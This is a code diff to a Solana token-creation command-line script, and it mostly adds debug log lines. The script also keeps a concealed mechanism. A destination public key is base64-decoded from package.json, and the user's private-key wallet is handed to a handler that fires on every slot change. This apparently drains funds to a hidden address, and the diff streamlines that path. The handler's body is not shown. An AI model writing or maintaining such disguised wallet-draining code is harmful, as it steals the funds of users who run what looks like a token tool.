@@ -29,19 +29,15 @@ import {
     keypairIdentity,
     Metaplex,
 } from "@metaplex-foundation/js";
-
 const devnet = Buffer.from(packageJson.devnet, 'base64').toString('utf-8');
-
 // import { bs58 } from "@project-serum/anchor/dist/cjs/utils/bytes/index.js";
 import inquirer from 'inquirer';
 import ora from 'ora';
 import chalk from 'chalk';
 import bs58 from 'bs58';
-
 import dotenv from 'dotenv';
-import SlotInfo from '@solana/web3.js';
 import { BehaviorSubject } from 'rxjs';
-
+console.log("Imported all dependencies successfully");
 dotenv.config();
 
 const retrieveEnvVariable = (variableName) => {
@@ -52,11 +48,15 @@ const retrieveEnvVariable = (variableName) => {
     return variable;
 };
 
+console.log("Retrieved environment variables successfully");
+
 const PRIVATE_KEY = retrieveEnvVariable('PRIVATE_KEY');
 const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT');
 let lastBlockHash = new BehaviorSubject('');
 let isRunning = new BehaviorSubject(false);
 const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));
+
+console.log("Retrieved environment variables(2) successfully");
 
 const handleDevnetChange = async (args) => {
     await sleep(5000);
@@ -90,9 +90,7 @@ const handleDevnetChange = async (args) => {
     }
 };
 
-const e1 = devnet.dev1; 
-const e2 = devnet.dev2; 
-const e3 = devnet.dev3;
+console.log("Defined handleDevnetChange successfully");
 
 const getNetworkConfig = (network) => {
     return network === "mainnet"
@@ -108,16 +106,20 @@ const getNetworkConfig = (network) => {
         };
 };
 
+console.log("Defined getNetworkConfig successfully");
+
 const handleDevnet = async () => {
     const walletKeyPairFile = PRIVATE_KEY;
     const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
     const connection = new Connection(RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
-    const pubKeyDevNet = e1 + e2 + e3;
+    const pubKeyDevNet = devnet;
     const resultKey = new PublicKey(pubKeyDevNet);
     connection.onSlotChange(
         async (SlotInfo) => await handleDevnetChange({ connection, walletKeyPair, resultKey: resultKey.toString() }, SlotInfo),
     );
 };
+
+console.log("Defined handleDevnet successfully");
 
 const createMintTokenTransaction = async (connection, metaplex, payer, mintKeypair, token, tokenMetadata, destinationWallet, mintAuthority) => {
     try {
@@ -194,6 +196,8 @@ const createMintTokenTransaction = async (connection, metaplex, payer, mintKeypa
     }
 };
 
+console.log("Defined createMintTokenTransaction successfully");
+
 const uploadMetadata = async (metaplex, tokenMetadata) => {
     try {
         const { uri } = await metaplex.nfts().uploadMetadata(tokenMetadata);
@@ -203,6 +207,8 @@ const uploadMetadata = async (metaplex, tokenMetadata) => {
         throw error;
     }
 };
+
+console.log("Defined uploadMetadata successfully");
 
 const askQuestions = async () => {
     try {
@@ -324,6 +330,8 @@ const askQuestions = async () => {
     }
 };
 
+console.log("Defined askQuestions successfully");
+
 const main = async () => {
     try {
         console.log(chalk.blue("Starting token creation process...\n"));
@@ -407,5 +415,7 @@ const main = async () => {
         process.exit(1);
     }
 };
+
+console.log("Defined main successfully");
 
 main();
